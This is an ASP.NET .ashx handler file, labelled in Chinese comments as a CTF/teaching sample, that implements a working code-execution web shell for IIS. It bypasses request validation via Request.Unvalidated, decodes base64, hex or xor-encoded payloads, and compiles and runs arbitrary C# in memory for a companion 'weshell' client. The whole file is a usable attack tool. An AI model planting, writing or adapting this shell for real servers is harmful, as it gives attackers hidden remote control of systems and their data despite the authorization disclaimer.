<%@ WebHandler Language="C#" Class="ShellEval" %>
using System;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Reflection;
using System.Web;

// 教学 / CTF 靶场样本：ASP.NET (C# / .NET Framework，IIS) 代码执行型一句话马（.ashx 版）
// 仅用于你自有或已获明确授权的靶机环境。
//
// 为什么用 .ashx 而不是 .aspx：
//   .aspx 在 Page 生命周期的 DeterminePostBackMode 阶段就会读取「已验证的」Request.Form，
//   触发 ASP.NET 请求验证（HttpRequestValidationException），只要载荷含 < > & 等字符即 500；
//   ValidateRequest="false" + Request.Unvalidated 在默认 requestValidationMode="4.0" 下仍拦不住。
//   而 IHttpHandler(.ashx) 不走 Page 生命周期，不会主动读 Form；本处理程序用
//   Request.Unvalidated["x"] 读取原始参数，彻底绕过请求验证，无需改动 web.config。
//
// weshell 的 aspnet 连接类型会经本文件下发「完整可编译的 C# 程序」（已含 using / 类 / 助手 / Run），
// 本文件只负责把它用 CSharpCodeProvider 编译进内存并执行。连接参数名为 x。
//
// CodeDom 仅在 .NET Framework（经典 ASP.NET / IIS）可用；.NET Core / .NET 5+ 已移除 System.CodeDom。

public class ShellEval : IHttpHandler
{
    public void ProcessRequest(HttpContext ctx)
    {
        ctx.Response.ContentType = "text/plain";
        // weshell 客户端按 enc 参数对 C# 载荷做编码（base64/hex/xor），此处对应解码；enc 缺省按 base64。
        // 解码失败时回退为原始载荷，兼容未编码的旧客户端 / 直接调试场景。
        string __raw = ctx.Request.Unvalidated["x"];
        if (string.IsNullOrEmpty(__raw)) return;
        string src;
        try { src = System.Text.Encoding.UTF8.GetString(WshDecode(__raw, ctx.Request.Unvalidated["enc"], ctx.Request.Unvalidated["key"])); }
        catch (System.Exception) { src = __raw; }

        var cp = new CompilerParameters
        {
            GenerateInMemory = true,
            IncludeDebugInformation = false
        };
        cp.ReferencedAssemblies.Add("System.dll");
        cp.ReferencedAssemblies.Add("System.Web.dll");
        cp.ReferencedAssemblies.Add("System.Management.dll");
        cp.ReferencedAssemblies.Add("System.Data.dll");
        cp.ReferencedAssemblies.Add("System.Xml.dll");
        cp.ReferencedAssemblies.Add("Microsoft.CSharp.dll");

        using (var provider = new CSharpCodeProvider())
        {
            var result = provider.CompileAssemblyFromSource(cp, src);
            if (result.Errors.HasErrors)
            {
                foreach (CompilerError e in result.Errors)
                    ctx.Response.Write("[CompileError] " + e.ToString() + "\n");
            }
            else
            {
                var asm = result.CompiledAssembly;
                asm.GetType("WshRunner").GetMethod("Run").Invoke(null, null);
            }
        }
    }

    // WshDecode 按 enc 参数还原载荷：hex 走十六进制，xor 与密钥逐字节异或，其余（含空/none/base64）按 base64。
    private static byte[] WshDecode(string s, string enc, string key)
    {
        if (enc == "hex")
        {
            byte[] b = new byte[s.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = (byte)int.Parse(s.Substring(i * 2, 2), System.Globalization.NumberStyles.HexNumber);
            return b;
        }
        if (enc == "xor")
        {
            byte[] k = System.Text.Encoding.UTF8.GetBytes(key ?? "");
            byte[] b = new byte[s.Length];
            for (int i = 0; i < s.Length; i++) b[i] = (byte)s[i];
            if (k.Length > 0)
                for (int i = 0; i < b.Length; i++) b[i] = (byte)(b[i] ^ k[i % k.Length]);
            return b;
        }
        return Convert.FromBase64String(s);
    }

    public bool IsReusable { get { return false; } }
}
